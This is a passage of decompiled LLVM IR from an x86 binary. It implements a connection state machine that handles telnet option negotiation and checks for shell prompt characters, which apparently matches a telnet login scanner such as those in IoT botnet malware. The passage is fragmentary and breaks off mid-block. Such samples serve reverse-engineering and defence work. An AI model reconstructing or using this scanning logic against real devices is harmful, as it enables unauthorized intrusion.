dec_label_pc_804e9ec.preheader:                   ; preds = %dec_label_pc_804e8e2
  %v0_804e9ec16 = load i32, i32* @edi, align 4
  %v1_804e9ec17 = add i32 %v0_804e9ec16, 12
  %v2_804e9ec18 = inttoptr i32 %v1_804e9ec17 to i32*
  %v3_804e9ec19 = load i32, i32* %v2_804e9ec18, align 4
  store i32 %v3_804e9ec19, i32* %eax.global-to-local, align 4
  %v1_804e9ef20 = icmp eq i32 %v3_804e9ec19, 0
  br i1 %v1_804e9ef20, label %dec_label_pc_804e8fd, label %dec_label_pc_804e9f7

dec_label_pc_804e8fd:                             ; preds = %dec_label_pc_804e9ec.backedge, %dec_label_pc_804e9ec.preheader, %dec_label_pc_804efd9, %dec_label_pc_804e917, %dec_label_pc_804e8e2, %dec_label_pc_804f4b7, %dec_label_pc_804f4ab, %dec_label_pc_804f011
  %v0_804e8fd = load i32, i32* @esp, align 4
  %v1_804e8fd = add i32 %v0_804e8fd, 1868
  %v2_804e8fd = inttoptr i32 %v1_804e8fd to i32*
  %v3_804e8fd = load i32, i32* %v2_804e8fd, align 4
  %v1_804e904 = add i32 %v3_804e8fd, 1
  store i32 %v1_804e904, i32* %eax.global-to-local, align 4
  store i32 %v1_804e904, i32* %v2_804e8fd, align 4
  %v0_804e90c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e90c = add i32 %v0_804e90c, -255
  %v6_804e90c = sub i32 254, %v0_804e90c
  %v7_804e90c = and i32 %v6_804e90c, %v0_804e90c
  %v8_804e90c = icmp slt i32 %v7_804e90c, 0
  %v9_804e90c = icmp eq i32 %v1_804e90c, 0
  %v10_804e90c = icmp slt i32 %v1_804e90c, 0
  %v3_804e911 = icmp eq i1 %v10_804e90c, %v8_804e90c
  %v4_804e911 = icmp eq i1 %v9_804e90c, false
  %v5_804e911 = and i1 %v4_804e911, %v3_804e911
  br i1 %v5_804e911, label %.loopexit, label %dec_label_pc_804e917

dec_label_pc_804e917:                             ; preds = %dec_label_pc_804e8fd, %dec_label_pc_804e8ba
  %v0_804e917 = phi i32 [ %v0_804e90c, %dec_label_pc_804e8fd ], [ 0, %dec_label_pc_804e8ba ]
  %v0_804e91a = load i32, i32* @global_var_8054438.21, align 8
  store i32 %v0_804e91a, i32* %ecx.global-to-local, align 4
  %v2_804e920 = mul i32 %v0_804e917, 288
  %v2_804e923 = add i32 %v0_804e91a, %v2_804e920
  store i32 %v2_804e923, i32* @edi, align 4
  %v1_804e925 = add i32 %v2_804e923, 4
  %v2_804e925 = inttoptr i32 %v1_804e925 to i32*
  %v3_804e925 = load i32, i32* %v2_804e925, align 4
  store i32 %v3_804e925, i32* %ecx.global-to-local, align 4
  %v10_804e928 = icmp eq i32 %v3_804e925, -1
  br i1 %v10_804e928, label %dec_label_pc_804e8fd, label %dec_label_pc_804e92d

dec_label_pc_804e92d:                             ; preds = %dec_label_pc_804e917
  %v2_804e931 = udiv i32 %v3_804e925, 32
  store i32 %v2_804e931, i32* %edx.global-to-local, align 4
  %v1_804e934 = urem i32 %v3_804e925, 32
  store i32 %v1_804e934, i32* %eax.global-to-local, align 4
  %v0_804e937 = load i32, i32* @esp, align 4
  %v2_804e937 = mul nuw nsw i32 %v2_804e931, 4
  %v3_804e937 = add nuw nsw i32 %v2_804e937, 1572
  %v4_804e937 = add i32 %v3_804e937, %v0_804e937
  %v5_804e937 = inttoptr i32 %v4_804e937 to i32*
  %v6_804e937 = load i32, i32* %v5_804e937, align 4
  %v9_804e937 = shl i32 1, %v1_804e934
  %v10_804e937 = and i32 %v6_804e937, %v9_804e937
  %v11_804e937 = icmp ne i32 %v10_804e937, 0
  %v1_804e93f = zext i1 %v11_804e937 to i32
  store i32 %v1_804e93f, i32* %eax.global-to-local, align 4
  %v4_804e942 = icmp eq i1 %v11_804e937, false
  br i1 %v4_804e942, label %dec_label_pc_804e8e2, label %dec_label_pc_804e946

dec_label_pc_804e946:                             ; preds = %dec_label_pc_804e92d
  %v1_804e946 = add i32 %v0_804e937, 1872
  %v2_804e946 = inttoptr i32 %v1_804e946 to i32*
  store i32 0, i32* %v2_804e946, align 4
  %v0_804e951 = load i32, i32* @esp, align 4
  %v1_804e951 = add i32 %v0_804e951, 1864
  %v2_804e951 = inttoptr i32 %v1_804e951 to i32*
  store i32 4, i32* %v2_804e951, align 4
  %v0_804e95c = load i32, i32* @esp, align 4
  %v1_804e95f = add i32 %v0_804e95c, 1864
  %v2_804e966 = add i32 %v0_804e95c, -16
  %v3_804e966 = inttoptr i32 %v2_804e966 to i32*
  store i32 %v1_804e95f, i32* %v3_804e966, align 4
  %v1_804e967 = add i32 %v0_804e95c, 1872
  store i32 %v1_804e967, i32* %eax.global-to-local, align 4
  %v2_804e96e = add i32 %v0_804e95c, -20
  %v3_804e96e = inttoptr i32 %v2_804e96e to i32*
  store i32 %v1_804e967, i32* %v3_804e96e, align 4
  %v1_804e96f = add i32 %v0_804e95c, -24
  %v2_804e96f = inttoptr i32 %v1_804e96f to i32*
  store i32 4, i32* %v2_804e96f, align 4
  %v1_804e971 = add i32 %v0_804e95c, -28
  %v2_804e971 = inttoptr i32 %v1_804e971 to i32*
  store i32 1, i32* %v2_804e971, align 4
  %v0_804e973 = load i32, i32* @edi, align 4
  %v1_804e973 = add i32 %v0_804e973, 4
  %v2_804e973 = inttoptr i32 %v1_804e973 to i32*
  %v3_804e973 = load i32, i32* %v2_804e973, align 4
  store i32 %v3_804e973, i32* %edx.global-to-local, align 4
  %v2_804e976 = add i32 %v0_804e95c, -32
  %v3_804e976 = inttoptr i32 %v2_804e976 to i32*
  store i32 %v3_804e973, i32* %v3_804e976, align 4
  %v0_804e977 = call i32 @function_80508b2()
  store i32 %v0_804e977, i32* %eax.global-to-local, align 4
  %v0_804e97c = load i32, i32* @esp, align 4
  %v2_804e97f = add i32 %v0_804e97c, 1904
  %v3_804e97f = inttoptr i32 %v2_804e97f to i32*
  %v4_804e97f = load i32, i32* %v3_804e97f, align 4
  %v5_804e97f = or i32 %v4_804e97f, %v0_804e977
  %v6_804e97f = icmp eq i32 %v5_804e97f, 0
  store i32 %v5_804e97f, i32* %eax.global-to-local, align 4
  %v1_804e986 = icmp eq i1 %v6_804e97f, false
  br i1 %v1_804e986, label %dec_label_pc_804f4b7, label %dec_label_pc_804e98c

dec_label_pc_804e98c:                             ; preds = %dec_label_pc_804e946
  %v0_804e98c = load i32, i32* @edi, align 4
  %v1_804e98c = add i32 %v0_804e98c, 12
  %v2_804e98c = inttoptr i32 %v1_804e98c to i32*
  store i32 2, i32* %v2_804e98c, align 4
  %v1_804e993 = call i32 @function_804d700(i32 ptrtoint (i32* @0 to i32))
  %v2_804e993 = sext i32 %v1_804e993 to i64
  %v0_804e998 = load i16, i16* @global_var_80543ec.22, align 4
  %v1_804e998 = zext i16 %v0_804e998 to i32
  %v0_804e9a5 = load i32, i32* @global_var_80543a0.23, align 32
  store i32 %v0_804e9a5, i32* @ebx, align 4
  store i32 %v1_804e998, i32* %ecx.global-to-local, align 4
  %v8_804e9af = zext i16 %v0_804e998 to i64
  %v9_804e9af = udiv i64 %v2_804e993, %v8_804e9af
  %v10_804e9af = trunc i64 %v9_804e9af to i32
  store i32 %v10_804e9af, i32* %eax.global-to-local, align 4
  %v11_804e9af = urem i64 %v2_804e993, %v8_804e9af
  %v12_804e9af = trunc i64 %v11_804e9af to i32
  store i32 %v12_804e9af, i32* %edx.global-to-local, align 4
  %tmp107 = icmp slt i32 %v0_804e9a5, 1
  br i1 %tmp107, label %dec_label_pc_804f489, label %dec_label_pc_804e9b9

dec_label_pc_804e9b9:                             ; preds = %dec_label_pc_804e98c
  %v0_804e9b9 = load i32, i32* @global_var_80543e8.24, align 8
  store i32 %v0_804e9b9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804e9ce = trunc i64 %v11_804e9af to i16
  br label %dec_label_pc_804e9ce

dec_label_pc_804e9c2:                             ; preds = %dec_label_pc_804e9d4, %dec_label_pc_804e9ce
  %v1_804e9c2 = add i32 %v0_804e9c2, 1
  store i32 %v1_804e9c2, i32* %ecx.global-to-local, align 4
  %v1_804e9c3 = add i32 %v0_804e9c3, 16
  store i32 %v1_804e9c3, i32* %eax.global-to-local, align 4
  %v12_804e9c6 = icmp eq i32 %v1_804e9c2, %v0_804e9a5
  br i1 %v12_804e9c6, label %dec_label_pc_804f489, label %dec_label_pc_804e9ce

dec_label_pc_804e9ce:                             ; preds = %dec_label_pc_804e9c2, %dec_label_pc_804e9b9
  %v0_804e9c2 = phi i32 [ %v1_804e9c2, %dec_label_pc_804e9c2 ], [ 0, %dec_label_pc_804e9b9 ]
  %v0_804e9c3 = phi i32 [ %v1_804e9c3, %dec_label_pc_804e9c2 ], [ %v0_804e9b9, %dec_label_pc_804e9b9 ]
  %v3_804e9ce = add i32 %v0_804e9c3, 8
  %v4_804e9ce = inttoptr i32 %v3_804e9ce to i16*
  %v5_804e9ce = load i16, i16* %v4_804e9ce, align 2
  %v11_804e9ce = icmp ult i16 %v1_804e9ce, %v5_804e9ce
  br i1 %v11_804e9ce, label %dec_label_pc_804e9c2, label %dec_label_pc_804e9d4

dec_label_pc_804e9d4:                             ; preds = %dec_label_pc_804e9ce
  %v3_804e9d4 = add i32 %v0_804e9c3, 10
  %v4_804e9d4 = inttoptr i32 %v3_804e9d4 to i16*
  %v5_804e9d4 = load i16, i16* %v4_804e9d4, align 2
  %v11_804e9d4 = icmp ult i16 %v1_804e9ce, %v5_804e9d4
  %v1_804e9d8 = icmp eq i1 %v11_804e9d4, false
  br i1 %v1_804e9d8, label %dec_label_pc_804e9c2, label %dec_label_pc_804f48b

dec_label_pc_804e9f7:                             ; preds = %dec_label_pc_804e9ec.preheader, %dec_label_pc_804e9ec.backedge.dec_label_pc_804e9f7_crit_edge
  %v1_804e9fa = phi i32 [ %v1_804e9fa.pre, %dec_label_pc_804e9ec.backedge.dec_label_pc_804e9f7_crit_edge ], [ %v0_804e8ea, %dec_label_pc_804e9ec.preheader ]
  %v0_804e9f7 = phi i32 [ %v0_804e9ec, %dec_label_pc_804e9ec.backedge.dec_label_pc_804e9f7_crit_edge ], [ %v0_804e9ec16, %dec_label_pc_804e9ec.preheader ]
  %v1_804e9f7 = add i32 %v0_804e9f7, 28
  store i32 %v1_804e9f7, i32* %eax.global-to-local, align 4
  %v2_804e9fa = add i32 %v1_804e9fa, 16
  %v3_804e9fa = inttoptr i32 %v2_804e9fa to i32*
  store i32 %v1_804e9f7, i32* %v3_804e9fa, align 4
  %v0_804e9fe = load i32, i32* @edi, align 4
  %v1_804e9fe = add i32 %v0_804e9fe, 24
  %v2_804e9fe = inttoptr i32 %v1_804e9fe to i32*
  %v3_804e9fe = load i32, i32* %v2_804e9fe, align 4
  %v9_804e9fe = icmp eq i32 %v3_804e9fe, 256
  br i1 %v9_804e9fe, label %dec_label_pc_804f035, label %dec_label_pc_804ea0b

dec_label_pc_804ea0b:                             ; preds = %dec_label_pc_804e9f7, %dec_label_pc_804f035
  %v0_804ea0b = load i32, i32* @esp, align 4
  %v1_804ea0b = add i32 %v0_804ea0b, 40
  %v2_804ea0b = inttoptr i32 %v1_804ea0b to i32*
  %v3_804ea0b = load i32, i32* %v2_804ea0b, align 4
  store i32 %v3_804ea0b, i32* %ecx.global-to-local, align 4
  %v1_804ea0f = add i32 %v0_804ea0b, 16
  %v2_804ea0f = inttoptr i32 %v1_804ea0f to i32*
  %v3_804ea0f = load i32, i32* %v2_804ea0f, align 4
  store i32 %v3_804ea0f, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804ea18 = inttoptr i32 %v3_804ea0b to i32*
  store i32 0, i32* %v1_804ea18, align 4
  %v0_804ea1e = load i32, i32* @edi, align 4
  %v1_804ea1e = add i32 %v0_804ea1e, 24
  %v2_804ea1e = inttoptr i32 %v1_804ea1e to i32*
  %v3_804ea1e = load i32, i32* %v2_804ea1e, align 4
  store i32 %v3_804ea1e, i32* %edx.global-to-local, align 4
  %v0_804ea21 = load i32, i32* @esp, align 4
  %v1_804ea21 = add i32 %v0_804ea21, -4
  %v2_804ea21 = inttoptr i32 %v1_804ea21 to i32*
  store i32 16384, i32* %v2_804ea21, align 4
  %v0_804ea26 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea26 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ea26 = sub i32 %v0_804ea26, %v1_804ea26
  store i32 %v2_804ea26, i32* %eax.global-to-local, align 4
  %v0_804ea28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ea28 = add i32 %v0_804ea28, %v1_804ea26
  store i32 %v2_804ea28, i32* @ebx, align 4
  %v2_804ea2a = add i32 %v0_804ea21, -8
  %v3_804ea2a = inttoptr i32 %v2_804ea2a to i32*
  store i32 %v2_804ea26, i32* %v3_804ea2a, align 4
  %v0_804ea2b = load i32, i32* @ebx, align 4
  %v2_804ea2b = add i32 %v0_804ea21, -12
  %v3_804ea2b = inttoptr i32 %v2_804ea2b to i32*
  store i32 %v0_804ea2b, i32* %v3_804ea2b, align 4
  %v0_804ea2c = load i32, i32* @edi, align 4
  %v1_804ea2c = add i32 %v0_804ea2c, 4
  %v2_804ea2c = inttoptr i32 %v1_804ea2c to i32*
  %v3_804ea2c = load i32, i32* %v2_804ea2c, align 4
  store i32 %v3_804ea2c, i32* %eax.global-to-local, align 4
  %v2_804ea2f = add i32 %v0_804ea21, -16
  %v3_804ea2f = inttoptr i32 %v2_804ea2f to i32*
  store i32 %v3_804ea2c, i32* %v3_804ea2f, align 4
  %v0_804ea30 = call i32 @function_8050910()
  store i32 %v0_804ea30, i32* %eax.global-to-local, align 4
  %v0_804ea35 = load i32, i32* @esp, align 4
  %v1_804ea35 = add i32 %v0_804ea35, 16
  %tmp108 = icmp slt i32 %v0_804ea30, 1
  br i1 %tmp108, label %dec_label_pc_804efca, label %dec_label_pc_804ea41

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804ea0b
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804ea43

dec_label_pc_804ea43:                             ; preds = %dec_label_pc_804ea4d, %dec_label_pc_804ea41
  %v0_804ea49 = phi i32 [ %v1_804ea4d, %dec_label_pc_804ea4d ], [ 0, %dec_label_pc_804ea41 ]
  %v1_804ea43 = load i32, i32* @ebx, align 4
  %v2_804ea43 = add i32 %v1_804ea43, %v0_804ea49
  %v3_804ea43 = inttoptr i32 %v2_804ea43 to i8*
  %v4_804ea43 = load i8, i8* %v3_804ea43, align 1
  %v5_804ea43 = icmp eq i8 %v4_804ea43, 0
  %v1_804ea47 = icmp eq i1 %v5_804ea43, false
  br i1 %v1_804ea47, label %dec_label_pc_804ea4d, label %dec_label_pc_804ea49

dec_label_pc_804ea49:                             ; preds = %dec_label_pc_804ea43
  store i8 65, i8* %v3_804ea43, align 1
  %v0_804ea4d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ea4d

dec_label_pc_804ea4d:                             ; preds = %dec_label_pc_804ea43, %dec_label_pc_804ea49
  %v0_804ea4d = phi i32 [ %v0_804ea49, %dec_label_pc_804ea43 ], [ %v0_804ea4d.pre, %dec_label_pc_804ea49 ]
  %v1_804ea4d = add i32 %v0_804ea4d, 1
  store i32 %v1_804ea4d, i32* @edx, align 4
  %v12_804ea4e = icmp eq i32 %v0_804ea30, %v1_804ea4d
  %v1_804ea50 = icmp eq i1 %v12_804ea4e, false
  br i1 %v1_804ea50, label %dec_label_pc_804ea43, label %dec_label_pc_804ea52

dec_label_pc_804ea52:                             ; preds = %dec_label_pc_804ea4d, %dec_label_pc_804efd0
  %v0_804ea52 = load i32, i32* @edi, align 4
  %v1_804ea52 = add i32 %v0_804ea52, 24
  %v2_804ea52 = inttoptr i32 %v1_804ea52 to i32*
  %v3_804ea52 = load i32, i32* %v2_804ea52, align 4
  %v2_804ea55 = add i32 %v3_804ea52, %v0_804ea30
  %v0_804ea57 = load i32, i32* @global_var_80543f0.9, align 16
  store i32 %v0_804ea57, i32* %eax.global-to-local, align 4
  store i32 %v2_804ea55, i32* %v2_804ea52, align 4
  %v0_804ea5f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea5f = load i32, i32* @edi, align 4
  %v2_804ea5f = add i32 %v1_804ea5f, 8
  %v3_804ea5f = inttoptr i32 %v2_804ea5f to i32*
  store i32 %v0_804ea5f, i32* %v3_804ea5f, align 4
  br label %dec_label_pc_804ea62

dec_label_pc_804ea62:                             ; preds = %dec_label_pc_804ed80, %dec_label_pc_804ea52
  %v0_804ea62 = load i32, i32* @edi, align 4
  %v1_804ea62 = add i32 %v0_804ea62, 12
  %v2_804ea62 = inttoptr i32 %v1_804ea62 to i32*
  %v3_804ea62 = load i32, i32* %v2_804ea62, align 4
  store i32 %v3_804ea62, i32* %eax.global-to-local, align 4
  switch i32 %v3_804ea62, label %dec_label_pc_804e9ec.backedge [
    i32 2, label %dec_label_pc_804ea72
    i32 3, label %dec_label_pc_804eb1b
    i32 4, label %dec_label_pc_804eb60
    i32 5, label %dec_label_pc_804eba0
    i32 6, label %dec_label_pc_804ec30
    i32 7, label %dec_label_pc_804eda0
    i32 8, label %dec_label_pc_804ebe5
    i32 9, label %dec_label_pc_804ee5b
    i32 10, label %dec_label_pc_804eceb
  ]

dec_label_pc_804ea72:                             ; preds = %dec_label_pc_804ea62
  %v0_804ea72 = load i32, i32* @esp, align 4
  %v1_804ea72 = add i32 %v0_804ea72, 16
  %v2_804ea72 = inttoptr i32 %v1_804ea72 to i32*
  %v3_804ea72 = load i32, i32* %v2_804ea72, align 4
  store i32 %v3_804ea72, i32* @ebx, align 4
  %v1_804ea76 = add i32 %v0_804ea72, 32
  %v2_804ea76 = inttoptr i32 %v1_804ea76 to i32*
  store i32 0, i32* %v2_804ea76, align 4
  %v0_804ea7e = load i32, i32* @edi, align 4
  %v1_804ea7e = add i32 %v0_804ea7e, 24
  %v2_804ea7e = inttoptr i32 %v1_804ea7e to i32*
  %v3_804ea7e = load i32, i32* %v2_804ea7e, align 4
  store i32 %v3_804ea7e, i32* %edx.global-to-local, align 4
  %v0_804ea81199 = load i32, i32* @esp, align 4
  %v1_804ea81200 = add i32 %v0_804ea81199, 32
  %v2_804ea81201 = inttoptr i32 %v1_804ea81200 to i32*
  %v3_804ea81202 = load i32, i32* %v2_804ea81201, align 4
  %v5_804ea81203 = sub i32 %v3_804ea81202, %v3_804ea7e
  %v11_804ea81204 = xor i32 %v3_804ea81202, %v3_804ea7e
  %v12_804ea81205 = xor i32 %v5_804ea81203, %v3_804ea81202
  %v13_804ea81206 = and i32 %v12_804ea81205, %v11_804ea81204
  %v14_804ea81207 = icmp slt i32 %v13_804ea81206, 0
  %v16_804ea81208 = icmp slt i32 %v5_804ea81203, 0
  %v2_804ea85209 = icmp eq i1 %v16_804ea81208, %v14_804ea81207
  br i1 %v2_804ea85209, label %dec_label_pc_804eb03, label %dec_label_pc_804ea87.preheader

dec_label_pc_804ea87.preheader:                   ; preds = %dec_label_pc_804ea72, %dec_label_pc_804ea81.backedge
  %v0_804ea81211 = phi i32 [ %v0_804ea81, %dec_label_pc_804ea81.backedge ], [ %v0_804ea81199, %dec_label_pc_804ea72 ]
  %v4_804ea81210 = phi i32 [ %v4_804ea81.be, %dec_label_pc_804ea81.backedge ], [ %v3_804ea7e, %dec_label_pc_804ea72 ]
  br label %dec_label_pc_804ea87

dec_label_pc_804ea87:                             ; preds = %dec_label_pc_804ea87.preheader, %dec_label_pc_804ead8
  %v1_804ea93 = phi i32 [ %v4_804eafd, %dec_label_pc_804ead8 ], [ %v4_804ea81210, %dec_label_pc_804ea87.preheader ]
  %v1_804ef20 = phi i32 [ %v1_804eafa, %dec_label_pc_804ead8 ], [ %v0_804ea81211, %dec_label_pc_804ea87.preheader ]
  %v0_804ea87 = load i32, i32* @ebx, align 4
  %v1_804ea87 = inttoptr i32 %v0_804ea87 to i8*
  %v2_804ea87 = load i8, i8* %v1_804ea87, align 1
  %v12_804ea87 = icmp eq i8 %v2_804ea87, -1
  %v1_804ea8a = icmp eq i1 %v12_804ea87, false
  br i1 %v1_804ea8a, label %dec_label_pc_804eb03, label %dec_label_pc_804ea8c

dec_label_pc_804ea8c:                             ; preds = %dec_label_pc_804ea87
  %v1_804ea8c = add i32 %v1_804ef20, 16
  %v2_804ea8c = inttoptr i32 %v1_804ea8c to i32*
  %v3_804ea8c = load i32, i32* %v2_804ea8c, align 4
  %v1_804ea90 = add i32 %v0_804ea87, 1
  store i32 %v1_804ea90, i32* %esi.global-to-local, align 4
  %v2_804ea93 = add i32 %v3_804ea8c, %v1_804ea93
  store i32 %v2_804ea93, i32* %ecx.global-to-local, align 4
  %tmp268 = icmp ugt i32 %v2_804ea93, %v1_804ea90
  br i1 %tmp268, label %dec_label_pc_804ea99, label %dec_label_pc_804eb03

dec_label_pc_804ea99:                             ; preds = %dec_label_pc_804ea8c
  %v2_804ea99 = inttoptr i32 %v1_804ea90 to i8*
  %v3_804ea99 = load i8, i8* %v2_804ea99, align 1
  %v4_804ea99 = zext i8 %v3_804ea99 to i32
  %v5_804ea99 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ea99 = and i32 %v5_804ea99, -256
  %v7_804ea99 = or i32 %v6_804ea99, %v4_804ea99
  store i32 %v7_804ea99, i32* %eax.global-to-local, align 4
  switch i8 %v3_804ea99, label %dec_label_pc_804eaac [
    i8 -1, label %dec_label_pc_804ef16
    i8 -3, label %dec_label_pc_804ef3a
  ]

dec_label_pc_804eaac:                             ; preds = %dec_label_pc_804ea99
  %v1_804eaac = add i32 %v0_804ea87, 2
  store i32 %v1_804eaac, i32* %eax.global-to-local, align 4
  %tmp269 = icmp ugt i32 %v2_804ea93, %v1_804eaac
  br i1 %tmp269, label %dec_label_pc_804eab3, label %dec_label_pc_804eb03

dec_label_pc_804eab3:                             ; preds = %dec_label_pc_804eaac, %dec_label_pc_804f4f3, %dec_label_pc_804f4fb, %dec_label_pc_804efc2
  %v0_804eab3 = load i32, i32* %esi.global-to-local, align 4
  %v1_804eab3 = inttoptr i32 %v0_804eab3 to i8*
  %v2_804eab3 = load i8, i8* %v1_804eab3, align 1
  %v3_804eab3 = zext i8 %v2_804eab3 to i32
  %v4_804eab3 = load i32, i32* %eax.global-to-local, align 4
  %v5_804eab3 = and i32 %v4_804eab3, -256
  %v6_804eab3 = or i32 %v5_804eab3, %v3_804eab3
  store i32 %v6_804eab3, i32* %eax.global-to-local, align 4
  switch i8 %v2_804eab3, label %dec_label_pc_804eac5 [
    i8 -3, label %dec_label_pc_804ef32
    i8 -5, label %dec_label_pc_804f024
  ]

dec_label_pc_804eac5:                             ; preds = %dec_label_pc_804eab3, %dec_label_pc_804ef32, %dec_label_pc_804f024
  %v0_804eac5 = load i32, i32* @ebx, align 4
  %v1_804eac5 = add i32 %v0_804eac5, 2
  %v2_804eac5 = inttoptr i32 %v1_804eac5 to i8*
  %v3_804eac5 = load i8, i8* %v2_804eac5, align 1
  %v4_804eac5 = zext i8 %v3_804eac5 to i32
  %v5_804eac5 = load i32, i32* %eax.global-to-local, align 4
  %v6_804eac5 = and i32 %v5_804eac5, -256
  %v7_804eac5 = or i32 %v6_804eac5, %v4_804eac5
  store i32 %v7_804eac5, i32* %eax.global-to-local, align 4
  switch i8 %v3_804eac5, label %dec_label_pc_804ead8 [
    i8 -3, label %dec_label_pc_804ef29
    i8 -5, label %dec_label_pc_804f02c
  ]

dec_label_pc_804ead8:                             ; preds = %dec_label_pc_804eac5, %dec_label_pc_804ef29, %dec_label_pc_804f02c
  %v0_804ead8 = load i32, i32* @esp, align 4
  %v1_804ead8 = add i32 %v0_804ead8, -4
  %v2_804ead8 = inttoptr i32 %v1_804ead8 to i32*
  store i32 16384, i32* %v2_804ead8, align 4
  %v1_804eadd = add i32 %v0_804ead8, -8
  %v2_804eadd = inttoptr i32 %v1_804eadd to i32*
  store i32 3, i32* %v2_804eadd, align 4
  %v0_804eadf = load i32, i32* @ebx, align 4
  %v2_804eadf = add i32 %v0_804ead8, -12
  %v3_804eadf = inttoptr i32 %v2_804eadf to i32*
  store i32 %v0_804eadf, i32* %v3_804eadf, align 4
  %v0_804eae0 = load i32, i32* @ebx, align 4
  %v1_804eae0 = add i32 %v0_804eae0, 3
  store i32 %v1_804eae0, i32* @ebx, align 4
  %v0_804eae3 = load i32, i32* @edi, align 4
  %v1_804eae3 = add i32 %v0_804eae3, 4
  %v2_804eae3 = inttoptr i32 %v1_804eae3 to i32*
  %v3_804eae3 = load i32, i32* %v2_804eae3, align 4
  store i32 %v3_804eae3, i32* %eax.global-to-local, align 4
  %v2_804eae6 = add i32 %v0_804ead8, -16
  %v3_804eae6 = inttoptr i32 %v2_804eae6 to i32*
  store i32 %v3_804eae3, i32* %v3_804eae6, align 4
  %v0_804eae7 = call i32 @function_8050986()
  store i32 %v0_804eae7, i32* %eax.global-to-local, align 4
  %v0_804eaec = load i32, i32* @esp, align 4
  %v1_804eaec = add i32 %v0_804eaec, 48
  %v2_804eaec = inttoptr i32 %v1_804eaec to i32*
  %v3_804eaec = load i32, i32* %v2_804eaec, align 4
  %v0_804eaf0 = load i32, i32* @edi, align 4
  %v1_804eaf0 = add i32 %v0_804eaf0, 24
  %v2_804eaf0 = inttoptr i32 %v1_804eaf0 to i32*
  %v3_804eaf0 = load i32, i32* %v2_804eaf0, align 4
  store i32 %v3_804eaf0, i32* %edx.global-to-local, align 4
  %v1_804eaf3 = add i32 %v3_804eaec, 3
  store i32 %v1_804eaf3, i32* %v2_804eaec, align 4
  %v0_804eafa = load i32, i32* @esp, align 4
  %v1_804eafa = add i32 %v0_804eafa, 16
  %v1_804eafd = add i32 %v0_804eafa, 48
  %v2_804eafd = inttoptr i32 %v1_804eafd to i32*
  %v3_804eafd = load i32, i32* %v2_804eafd, align 4
  %v4_804eafd = load i32, i32* %edx.global-to-local, align 4
  %v5_804eafd = sub i32 %v3_804eafd, %v4_804eafd
  %v11_804eafd = xor i32 %v4_804eafd, %v3_804eafd
  %v12_804eafd = xor i32 %v5_804eafd, %v3_804eafd
  %v13_804eafd = and i32 %v12_804eafd, %v11_804eafd
  %v14_804eafd = icmp slt i32 %v13_804eafd, 0
  %v16_804eafd = icmp slt i32 %v5_804eafd, 0
  %v2_804eb01 = icmp eq i1 %v16_804eafd, %v14_804eafd
  br i1 %v2_804eb01, label %dec_label_pc_804eb03, label %dec_label_pc_804ea87

dec_label_pc_804eb03:                             ; preds = %dec_label_pc_804ea72, %dec_label_pc_804ea81.backedge, %dec_label_pc_804ef3a, %dec_label_pc_804eaac, %dec_label_pc_804ea8c, %dec_label_pc_804ead8, %dec_label_pc_804ea87
  %v0_804eb03 = phi i32 [ %v1_804eafa, %dec_label_pc_804ead8 ], [ %v1_804ef20, %dec_label_pc_804eaac ], [ %v1_804ef20, %dec_label_pc_804ea8c ], [ %v1_804ef20, %dec_label_pc_804ea87 ], [ %v0_804ef9a, %dec_label_pc_804ef3a ], [ %v0_804ea81199, %dec_label_pc_804ea72 ], [ %v0_804ea81, %dec_label_pc_804ea81.backedge ]
  %v1_804eb03 = add i32 %v0_804eb03, 32
  %v2_804eb03 = inttoptr i32 %v1_804eb03 to i32*
  %v3_804eb03 = load i32, i32* %v2_804eb03, align 4
  store i32 %v3_804eb03, i32* @esi, align 4
  %tmp109 = icmp slt i32 %v3_804eb03, 1
  br i1 %tmp109, label %dec_label_pc_804f058, label %dec_label_pc_804eb0f

dec_label_pc_804eb0f:                             ; preds = %dec_label_pc_804eb03
  %v0_804eb0f = load i32, i32* @edi, align 4
  %v1_804eb0f = add i32 %v0_804eb0f, 12
  %v2_804eb0f = inttoptr i32 %v1_804eb0f to i32*
  store i32 3, i32* %v2_804eb0f, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804eb1b:                             ; preds = %dec_label_pc_804ea62
  %v1_804eb1b = add i32 %v0_804ea62, 24
  %v2_804eb1b = inttoptr i32 %v1_804eb1b to i32*
  %v3_804eb1b = load i32, i32* %v2_804eb1b, align 4
  %v1_804eb1e = add i32 %v3_804eb1b, -1
  store i32 %v1_804eb1e, i32* %eax.global-to-local, align 4
  %tmp110 = icmp slt i32 %v1_804eb1e, 1
  br i1 %tmp110, label %dec_label_pc_804f22b, label %dec_label_pc_804eb27.preheader

dec_label_pc_804eb27.preheader:                   ; preds = %dec_label_pc_804eb1b
  %v7_804eb27.pre = load i32, i32* @edx, align 4
  %v2_804eb27 = add i32 %v0_804ea62, 28
  br label %dec_label_pc_804eb27

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804eb27.preheader, %dec_label_pc_804eb58
  %v7_804eb27 = phi i32 [ %v7_804eb27.pre, %dec_label_pc_804eb27.preheader ], [ %v9_804eb27, %dec_label_pc_804eb58 ]
  %v0_804f21f = phi i32 [ %v1_804eb1e, %dec_label_pc_804eb27.preheader ], [ %v1_804eb58, %dec_label_pc_804eb58 ]
  %v3_804eb27 = add i32 %v2_804eb27, %v0_804f21f
  %v4_804eb27 = inttoptr i32 %v3_804eb27 to i8*
  %v5_804eb27 = load i8, i8* %v4_804eb27, align 1
  %v6_804eb27 = zext i8 %v5_804eb27 to i32
  %v8_804eb27 = and i32 %v7_804eb27, -256
  %v9_804eb27 = or i32 %v6_804eb27, %v8_804eb27
  store i32 %v9_804eb27, i32* %edx.global-to-local, align 4
  switch i8 %v5_804eb27, label %dec_label_pc_804eb58 [
    i8 58, label %dec_label_pc_804f21f
    i8 62, label %dec_label_pc_804f21f
    i8 36, label %dec_label_pc_804f21f
    i8 35, label %dec_label_pc_804f21f
    i8 37, label %dec_label_pc_804f21f
  ]

dec_label_pc_804eb58:                             ; preds = %dec_label_pc_804eb27
